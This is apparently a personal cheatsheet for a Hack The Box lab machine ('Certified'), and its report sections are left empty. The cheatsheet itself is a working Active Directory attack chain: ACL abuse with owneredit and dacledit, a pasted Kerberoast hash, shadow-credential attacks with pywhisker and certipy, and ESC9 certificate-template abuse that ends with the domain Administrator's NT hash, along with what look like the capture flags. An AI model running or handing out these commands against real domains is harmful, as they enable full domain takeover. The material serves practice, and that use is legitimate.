# Certified \[Medium]

## Report



## Cheatsheet

```
10.10.11.41
clock-skew: mean: 7h00m01s
DNS:certified.htb
judith.mader:judith09

alexander.huges
ca_operator
gregory.cameron
harry.wilson
management_svc
owneredit.py -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.10.11.41
dacledit.py -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.10.11.41
net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "10.10.11.41"
net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41

getUserSPN
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$e8f84a59f798bfdfca666fd3994545c2$78553ab876b1e51cba2735cfd17c0194d600dc49121f82a7f65b190e891971b73e8603485ee5fdd22db2dad07a4bce5778f4796a7e6e6b17aff90d3e517262eb7f5433084472d37e641d31827f5ed4c1e550a24e80f05c74dff5105a13d30dbf80406151b8bc1b05840775708d461838e54317f44750d1c169df3d0d37f86ab2e4c62f628a0f0cbaf0e60a605862f2e3bcbd826b870583732b351e1052c62610b1fa87c930ee2fb2cda996f60c385e014495a00606d332851e8725949725819ff022c56f16667a57216ec92567e1756af98049c00877bbdebfbbd7e48af8e47d205a78b2c64be2a5cd3a99f40b203f128060ed084e2b065c39e2dcd604269ba3e8362298263d535f02f06eab380a52cc5b53fc6a688cf4a010f1265f6bec1aaca3978260c6d78c96609bbaef4527ad750c34cb1cb44801a8ed1ca0bfcf27e630fcd6014694f04b94343ed246bd70ad5eaa0cc8b80c1d364485e05632452fba3faad75511205697be99f6e402f6ad6cbb3fa7f043291a6122e40c7bf7404e6bbd28b0f2afc9af6807e46f3c09c73a5618ed25768306609f862c7ce6d48c3a75cde73c1d69c6381a93febad069c9ae02374f81f85fe0d7ace9c967920d9ddfd7c13976be977c4a6cb6256bcb6c452647a5c9df009b873492cbbdfcab6991f4e53150b1aec227ec08b087374c4fb1fe53c13c7c2dc98857a191237944d810c6a7a59d043ebce7786c1659139c89230ba944878bf2b860d6bfdadb7dd1ecdbaf726397473ad14f9f331fffa018c09e226290f94520547feb9e2154a37e35fffde18066d6121de2d562c26b16e864eddfb6977350e241fa12ee89f84c13748ed56a6eed0c0a743676096c5ea51aef3fdc29c991c83cc9835f789f2406fb2d12f02ca6e86ddd80e72032531f927343b4f14dcfd19cbb5052a371590f9079b87e12bd2b5acb3156a6872c40212d73f0748c77909c9d8b2601170392ea9193a7d526c330232569e83a5b1c72417c26995c995a404e6c5c2f34244fe3a984850a7cd6d876161fbd04bcab837898a43f6606cd58b5dea8facf0b7c0ba28ef71da8586b403feca4b12acb4a0a0267a8ca37a1a4cbb0a60098603421d4a177b97f6b127062fe90fdfb2239e13f30a0d38b50cf5dd4c195359320badf5cd038d234451e79618c9e0971b639b0069da12ecc2840736c0c9a77a0378556d5ed3d223a5ea64ea2b201326584dae64028b18212be37d0ad67cf4e10481ae5cb443f11e52c26f1241610631b8cca5efcfdfd17b0ec4f653c050839daf88d8206e4e868a9fe417c3c74ad5c9056be09a04916dd63413f733b08451e9d8b2dbf3494ba9b5257a5306c7a1523d7d3698b0f274ca159e26c6d7e86df48df85fcd2d8c0511e59a2ee11186707f450222734a764666f27685179966574995a9a5f79b13c808742551a082899b9ef4460188829c83bd11d34ae3fbb73b1866598a81eb2ef822dfe45c67bf30022b032db63cbb94acff2cd2c57fab364d174ba5260115fe6681ec31fe0e069962401b6a08ac5e8667a4823974a0fb68541d59cbe5bb0377e771f5d227a30bce7dd2d

couldnt crack it - makes me think it was deesigned to be

pywhisker the OG way, certipy-ad automate the full thing
pywhisker -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
faketime -f '+7h' certipy-ad shadow auto -u judith.mader@certified.htb -p judith09 -account management_svc
'management_svc': a091c1832bcdd4677c28b5a6a1295584
do same for ca_operator also (GenericAll privs)
'ca_operator': b4b86f45c6018f1b664f70805f45d8f2

certipy-ad find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -stdout
ESC9 vulnerable

certipy-ad account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41
certipy-ad req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
CLEANUP
certipy-ad account update -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41

certipy-ad auth -pfx administrator.pfx -domain certified.htb     
administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34

bcf6391215810477f262d8a25c8b7351
8194d35b405fd34eddd9e28bbd05fab7

```

## Loot

### Enumeration



### Attack Vector



### PrivEsc



### Creds



### Proof
